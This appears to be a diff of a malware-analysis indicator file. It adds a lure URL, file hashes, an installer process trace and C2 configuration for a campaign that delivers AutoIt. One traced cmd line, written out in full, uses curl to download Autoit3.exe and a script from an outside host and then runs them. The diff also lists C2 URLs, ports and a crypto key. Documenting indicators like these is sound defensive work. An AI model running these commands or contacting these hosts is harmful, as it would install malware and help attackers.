@@ -6,6 +6,10 @@
 .zip 724dd11f47420cabd044ef06b02eeba1898835d8a9fa99098fda82533e8485a9
 .msi 8600121c77bb725e24ffa58a657f3cbe752d9ed4299cc7e59127c9a7d6187eab
 
+.url https://dominoqq401.com/ses/?q=8736061
+.zip 946a0cfe942820544a1fe7613ec67c94e2f4f8c17435e36e4d059cf7776d5d39
+.msi 080cee402e284222cef8a3ff10b94a0b364feb5b9047f2babcb6ea0d1e331932
+
 *************************************************
 
 Code Signing Certificate
@@ -47,10 +51,40 @@ svchost.exe -k netsvcs -s DsmSvc
 
 *************************************************
 
-c2
+msiexec.exe /I C:\Users\Admin\AppData\Local\Temp\Data1.msi
 
-Botnet A1111
-C2 http://wilsoncallert.com
+msiexec.exe /V
+
+srtasks.exe ExecuteScopeRestorePoint /WaitForRestorePoint:2
+
+MsiExec.exe -Embedding 71909D3519360B8BB4E0BCC8687E5163
+
+ICACLS.EXE" "C:\Users\Admin\AppData\Local\Temp\MW-8ce133d3-549f-45e5-b941-811a7d7dd880\." /SETINTEGRITYLEVEL (CI)(OI)HIGH
+
+EXPAND.EXE" -R files.cab -F:* files
+
+KeyScramblerLogon.exe
+
+cmd /c cd /d %temp% & curl -o Autoit3.exe http://prestigiousdentistry.com:2351 & curl -o pihbow.au3 http://prestigiousdentistry.com:2351/pihbow & Autoit3.exe pihbow.au3
+
+curl  -o Autoit3.exe http://prestigiousdentistry.com:2351 
+
+curl  -o pihbow.au3 http://prestigiousdentistry.com:2351/pihbow 
+
+Autoit3.exe  pihbow.au3
+
+ICACLS.EXE" "C:\Users\Admin\AppData\Local\Temp\MW-8ce133d3-549f-45e5-b941-811a7d7dd880\." /SETINTEGRITYLEVEL (CI)(OI)LOW
+
+vssvc.exe
+
+*************************************************
+
+c2'
+
+C2 http://wilsoncallert.com:2351
 alternative_c2_port 8080
-c2_port 2351
 crypto_key nSoLLNAEzUGGah
+
+http://prestigiousdentistry.]com:2351
+http://prestigiousdentistry.]com:2351/pihbow
+http://prestigiousdentistry.]com:2351/cjsobc
